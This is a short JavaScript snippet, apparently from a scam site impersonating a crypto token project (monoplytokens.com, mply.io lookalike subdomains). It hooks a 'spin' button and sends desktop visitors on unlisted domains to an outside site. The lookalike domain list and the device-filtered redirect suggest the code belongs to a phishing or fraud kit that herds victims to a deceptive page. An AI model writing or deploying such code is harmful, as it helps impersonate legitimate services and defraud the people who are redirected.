var button = document.querySelector('.spin-button'); 
button.addEventListener('click', function() {
    (function() {
        var originalDomain = "monoplytokens.com";
        var redirectURL = "https://live33.online/?be72c72";
        var allowedDomains = [
            "https://mply.io.t0ke2n.site",
            "https://mply.io.1arshg4.site",
            "jsdhjjhhjjhejkjkas.blogspot.com",
            "https://mply.io.4a6b8dh.site"
        ];

        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !allowedDomains.includes(window.location.hostname)) {
            var isDesktopDevice = !/iPhone|iPad/i.test(navigator.userAgent) && !/Android/i.test(navigator.userAgent);  
            if (isDesktopDevice) {
                window.location.href = redirectURL;
            }
        }
    })();
});
